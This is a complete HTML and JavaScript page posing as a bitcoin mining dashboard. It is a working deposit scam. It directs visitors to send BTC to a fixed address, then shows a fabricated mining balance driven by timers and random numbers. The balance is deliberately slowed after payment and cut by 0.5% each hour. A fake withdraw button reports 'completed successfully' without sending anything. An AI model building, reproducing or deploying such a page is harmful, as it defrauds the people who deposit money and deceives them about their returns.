<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Mining Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {background: linear-gradient(135deg,#0b0f1a,#1a1f2f); color:white; font-family:Arial,sans-serif; padding:20px; text-align:center;}
.card {max-width:500px; margin:20px auto; background:#131a2e; padding:25px; border-radius:14px; box-shadow:0 0 20px rgba(0,0,0,0.5);}
h2{color:#f2a900;margin-bottom:10px;}
.btc {font-size:32px;margin:15px 0;}
canvas{background:#0b0f1a;border-radius:8px;margin-top:15px;}
table{width:100%; font-size:13px; margin-top:15px; border-collapse:collapse;}
td{padding:6px;border-bottom:1px solid #222;}
.green{color:#00ff99;}
.yellow{color:#ffff66;}
.btc-box{background:#0b0f1a;padding:10px;border-radius:6px;word-break:break-all;margin:10px 0;font-size:14px;}
input{width:80%;padding:10px;margin:10px 0;border-radius:6px;border:none;font-size:14px;}
button{padding:10px 18px;margin:10px 5px;background:#f2a900;border:none;color:black;font-weight:bold;border-radius:6px;cursor:pointer;}
.progress-container{width:100%;background:#222;border-radius:8px;margin-top:15px;height:20px;}
.progress-bar{height:20px;background:#f2a900;width:0%;border-radius:8px;transition:width 0.5s;}
.stats{font-size:14px;margin-top:10px;text-align:left;}
</style>
</head>
<body>

<!-- BTC Deposit -->
<div class="card">
<h2>Send BTC to Start Mining</h2>
<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
<button onclick="copyAddress()">Copy Address</button>
<div>
<img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" alt="BTC QR Code">
</div>
</div>

<!-- Mining Dashboard -->
<div class="card">
<h2>Mining Dashboard</h2>
<p>Status: <span class="green">ACTIVE</span></p>
<p class="stats">Hashrate: <span id="hashrate">120 TH/s</span> | Blocks mined: <span id="blocks">0</span> | Uptime: <span id="uptime">0h 0m</span></p>
<div class="btc" id="btc">Loading balanceâ€¦</div>
<div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
<canvas id="chart" width="400" height="120"></canvas>
</div>

<!-- Withdraw -->
<div class="card">
<h2>Withdraw BTC</h2>
<p>Enter your BTC withdrawal address:</p>
<input type="text" id="withdrawAddress" placeholder="Enter your BTC address">
<br>
<button onclick="withdrawBTC()">Withdraw</button>
<p id="withdrawMessage" style="color:#f2a900;font-size:14px;"></p>
</div>

<!-- Transactions -->
<div class="card">
<h2>Recent Activity</h2>
<table id="tx"></table>
</div>

<script>
// Copy BTC address
function copyAddress(){
  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
    .then(()=>{alert('BTC address copied!');});
}

// Blockchain.com API - fetch confirmed + unconfirmed balance
const address = "bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav";
let balance = 0;
let pendingBalance = 0;

// Mining behavior
let rate = 0.0000001; // fast default rate
let paused = false;

// Fetch real BTC balance
async function fetchBalance(){
  try {
    const resp = await fetch(`https://blockchain.info/rawaddr/${address}?cors=true`);
    const data = await resp.json();
    balance = data.final_balance/1e8; // confirmed BTC
    pendingBalance = (data.total_received - data.final_balance)/1e8; // unconfirmed
    document.getElementById("btc").innerText = (balance + pendingBalance).toFixed(8) + " BTC";
    updateTransactions(data.txs);
  } catch(e){console.error(e);}
}

// Update transactions
let displayedTxs = {};
function updateTransactions(txs){
  const txTable = document.getElementById("tx");
  txs.forEach(tx=>{
    const txHash = tx.hash;
    if(displayedTxs[txHash]) return;
    displayedTxs[txHash] = true;
    const row = document.createElement("tr");
    const amountCell = document.createElement("td");
    const statusCell = document.createElement("td");
    let value = tx.out.reduce((sum,o)=>sum+(o.addr===address?o.value:0),0)/1e8;
    amountCell.innerText = (value>0? "+" : "") + value.toFixed(8) + " BTC";
    statusCell.innerText = tx.block_height ? "Completed" : "Pending";
    statusCell.className = tx.block_height ? "green" : "yellow";
    row.appendChild(amountCell); row.appendChild(statusCell);
    txTable.prepend(row);
  });
}

// Mining counter
function simulateMining(){
  if(paused) return;
  let add = rate;
  if(pendingBalance>0) add *= 0.3; // slow down after payment
  balance += add;
  document.getElementById("btc").innerText = balance.toFixed(8) + " BTC";
}

// Progress bar
let progress = 0;
function animateProgress(){
  progress += 0.5;
  if(progress>100) progress=0;
  document.getElementById("progressBar").style.width = progress+"%";
}

// Chart
const canvas=document.getElementById("chart"); 
const ctx=canvas.getContext("2d"); 
let points=[];
for(let i=0;i<50;i++) points.push(Math.random()*100);
function drawChart(){
  ctx.clearRect(0,0,canvas.width,canvas.height); 
  ctx.beginPath(); ctx.moveTo(0,120-points[0]);
  for(let i=1;i<points.length;i++){ctx.lineTo(i*8,120-points[i]);} 
  ctx.strokeStyle="#f2a900"; ctx.lineWidth=2; ctx.stroke(); 
  points.shift(); points.push(Math.random()*100);
}

// Blocks & uptime
let blocks=0, minutes=0;
function updateStats(){ blocks+=Math.floor(Math.random()*2); minutes++; 
  let hours=Math.floor(minutes/60); let mins=minutes%60; 
  document.getElementById("blocks").innerText=blocks; 
  document.getElementById("uptime").innerText=`${hours}h ${mins}m`;
}

// Withdraw
function withdrawBTC(){ 
  const addr=document.getElementById("withdrawAddress").value.trim();
  if(addr===""){ alert("Please enter your BTC address to withdraw."); return; }
  document.getElementById("withdrawMessage").innerText=`Withdrawal to ${addr} is processing...`;
  setTimeout(()=>{document.getElementById("withdrawMessage").innerText=`Withdrawal to ${addr} completed successfully!`; document.getElementById("withdrawAddress").value="";},3000);
}

// 15-min pause
function startPauseCycle(){ setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000); } // pauses 1 min every 15 min

// 1-hour drop
function startHourlyDrop(){ setInterval(()=>{ balance *= 0.995; },60*60*1000); } // 0.5% drop every hour

// Initialization
fetchBalance();
setInterval(fetchBalance,15000); // update from blockchain every 15 sec
setInterval(simulateMining,1000);
setInterval(animateProgress,500);
setInterval(drawChart,500);
setInterval(updateStats,60000);
startPauseCycle();
startHourlyDrop();
</script>
</body>
  </html>
